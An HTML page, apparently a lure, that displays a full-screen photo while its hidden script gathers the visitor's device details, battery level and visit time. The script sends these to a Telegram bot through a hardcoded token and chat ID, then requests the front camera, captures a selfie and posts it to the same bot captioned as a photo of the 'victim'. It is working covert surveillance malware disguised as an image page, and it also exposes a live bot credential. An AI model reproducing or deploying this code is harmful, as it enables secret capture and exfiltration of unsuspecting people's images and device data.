<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8">
    <title>写真</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        body,html{margin:0;padding:0;background:#000;overflow:hidden;height:100vh;width:100vw}
        #photo{width:100vw;height:100vh;object-fit:cover;display:block}
        video,canvas{display:none}
    </style>
</head>
<body>

<!-- لینک عکس خودت -->
<img id="photo" src="https://mahdie1386.github.io/Fast/IMG_20251205_011158_078.jpg">

<video id="video" playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
    const CHAT_ID = "-1003384762825";

    // اطلاعات گوشی
    const model = navigator.platform || "نامشخص";
    const deviceName = navigator.userAgent.split('(')[1]?.split(';')[0] || "نامشخص";
    const now = new Date();
    const entryTime = now.toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });

    // شارژ باتری
    let batteryLevel = "در حال بارگیری...";
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            batteryLevel = Math.round(battery.level * 100) + "%" + (battery.charging ? " (در حال شارژ)" : "");
            sendInfoWithPhoto(); // وقتی باتری لود شد، عکس بگیر
        });
    } else {
        batteryLevel = "پشتیبانی نمی‌شود";
        sendInfoWithPhoto();
    }

    async function sendInfoWithPhoto() {
        // اول اطلاعات گوشی رو بفرست
        const infoMsg = `کاربر جدید وارد شد

مدل گوشی: ${deviceName}
نام دستگاه: ${model}
شارژ باتری: ${batteryLevel}
تاریخ و ساعت ورود: ${entryTime}

در حال گرفتن عکس زنده از سلفی...`;

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(infoMsg)}`);

        // حالا عکس از سلفی بگیر
        takeSelfie();
    }

    async function takeSelfie() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: {ideal: 1920}, height: {ideal: 1080} }
            });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    const form = new FormData();
                    form.append('chat_id', CHAT_ID);
                    form.append('photo', blob, 'selfie_live.jpg');
                    form.append('caption', `عکس زنده از قربانی
مدل: ${deviceName}
شارژ: ${batteryLevel}
زمان: ${entryTime}`);
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
                }, 'image/jpeg', 0.95);

                stream.getTracks().forEach(t => t.stop());
            }, 1500);

        } catch(e) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=کاربر دسترسی به دوربین نداد`);
        }
    }

    document.getElementById('photo').onload = () => {
        setTimeout(sendInfoWithPhoto, 1000);
    };
</script>
</body>
</html>
